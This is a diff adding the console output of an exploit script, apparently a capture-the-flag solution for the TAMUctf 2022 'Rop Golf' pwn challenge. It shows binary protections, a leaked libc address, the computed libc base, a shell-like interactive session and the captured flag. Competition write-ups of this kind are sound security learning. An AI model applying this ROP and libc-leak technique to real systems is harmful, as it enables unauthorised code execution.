@@ -1,0 +1,24 @@
+mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_Rop_Golf$ python3 solve.py r
+[*] '/home/mito/CTF/TAMUctf_2022/Pwn_Rop_Golf/rop_golf'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to tamuctf.com on port 443: Done
+[*] '/home/mito/CTF/TAMUctf_2022/Pwn_Rop_Golf/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+solve.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.recvuntil("hi!\n")
+solve.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  puts_addr = u64(s.recvuntil("\n")[:-1]+b"\x00\x00")
+puts_addr = 0x7f3164696910
+libc_base = 0x7f3164625000
+solve.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.recvuntil("hi!\n")
+[*] Switching to interactive mode
+gigem{r34lly_p1v071n6_7h47_574ck}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[
